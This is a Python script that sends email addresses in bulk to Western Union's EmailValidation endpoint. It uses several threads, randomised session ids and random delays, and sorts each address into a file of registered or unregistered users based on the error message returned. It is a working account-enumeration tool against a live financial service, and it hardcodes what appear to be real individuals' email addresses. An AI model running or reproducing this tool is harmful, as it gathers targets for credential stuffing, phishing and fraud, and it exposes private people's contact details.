import time
import json
import queue
import urllib
import random
from threading import Thread, Lock, current_thread

from logger import log
from request_mods import add_request_headers
from random_requests import get_random_session_request


num_worker_threads = 3
q = queue.Queue()
lock = Lock()

def make_requests():
    global q
    emails = open('data/emails.txt','r').readlines()
    
    emails = [
        'nilavghosh@gmail.com',
        'nilavghosh@hotmail.com',
        'claggettniakia@yahoo.com',
        'test@test.com',
        'a@a.com',
        # 'marandagibson@gmail.com',
        # 'sammie-may@live.com',
        # 'ssantmier01@gmail.com',
        # 'lmhowze@yahoo.com',
        # 'stefiep00@gmail.com',
        # 'vmgingrich@sbcglobal.net'
    ]
    emails_by_workers = int(len(emails) / num_worker_threads) + bool(len(emails) % num_worker_threads)

    # Distribute the emails equally between the workers
    for i in range(num_worker_threads):
        start = i * emails_by_workers
        end = start + emails_by_workers
        q.put(emails[start:end])
        # request_www_westernunion_com(session_id, email)

def request_www_westernunion_com(emails):
    log.info("Emails for {}: {}".format(current_thread().name, ', '.join(emails)))
    for email in emails:
        try:
            # Add some delay between requests
            time.sleep(random.randint(2, 4))

            # req = urllib.request.Request("https://www.westernunion.com/wuconnect/rest/api/v1.0/EmailValidation?timestamp=1537800289672")
            
            # add_request_headers(req)
            req, session_id = get_random_session_request()
            
            body_dict = {'email': 'nilavghosh@gmail.com',
                         'security': {'session': {'id': 'web-6ed27a12-0ca5-4adb-a0c8-fd5e7f3c403b'},
                         'version': '2'},
                         'bashPath': '/us/en'}
            body_dict['email'] = email
            body_dict['security']['session']['id'] = session_id
            body = json.dumps(body_dict).encode()
            # body = b"{\"email\":\"nilavghosh@gmail.com\",\"security\":{\"session\":{\"id\":\"web-6ed27a12-0ca5-4adb-a0c8-fd5e7f3c403b\"},\"version\":\"2\"},\"bashPath\":\"/us/en\"}"

            response = urllib.request.urlopen(req, body)
            data = response.fp.read()
            if data:
                msg = json.loads(data.decode('utf-8'))['error']['message']
                log.error(msg)
                if "We can't find that email address" in msg:
                    log.info('Not registered: {}'.format(email))
                    with open('data/not_registered_emails.txt', 'a') as fp:
                        fp.write('{}\n'.format(email))
                else:
                    log.info('Registered: {}'.format(email))
                    with open('data/registered_emails.txt', 'a') as fp:
                        fp.write('{}\n'.format(email))
            else:
                print(data)

        except urllib.error.URLError as e:
            if not hasattr(e, "code"):
                return False
            raise e
        except Exception as e:
            raise e



def worker():
    while True:
        with lock:
            emails = q.get()
        if emails is None:
            break
        request_www_westernunion_com(emails)
        # q.task_done()
        # time.sleep(1)

threads = []
for i in range(num_worker_threads):
    t = Thread(target=worker, name='worker {}'.format(i))
    t.start()
    threads.append(t)


make_requests()


# block until all tasks are done
# q.join()

# stop workers
for i in range(num_worker_threads):
    q.put(None)
for t in threads:
    t.join()

# request_www_westernunion_com(['vmgingrich@sbcglobal.net'])








# def worker():
#     while True:
#         item = q.get()
#         if item is None:
#             break
#         do_work(item)
#         q.task_done()

# threads = []
# for i in range(num_worker_threads):
#     t = threading.Thread(target=worker)
#     t.start()
#     threads.append(t)

# for item in source():
#     q.put(item)

# # block until all tasks are done
# q.join()

# # stop workers
# for i in range(num_worker_threads):
#     q.put(None)
# for t in threads:
#     t.join()